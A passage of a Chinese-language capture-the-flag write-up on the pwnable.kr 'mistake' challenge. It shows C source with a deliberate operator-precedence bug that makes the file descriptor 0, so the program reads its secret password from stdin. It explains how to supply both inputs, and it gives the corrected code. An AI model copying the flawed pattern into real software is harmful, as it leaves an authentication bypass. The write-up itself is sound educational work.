i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/2.png" class></strong></p>
-<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
-<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/3.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
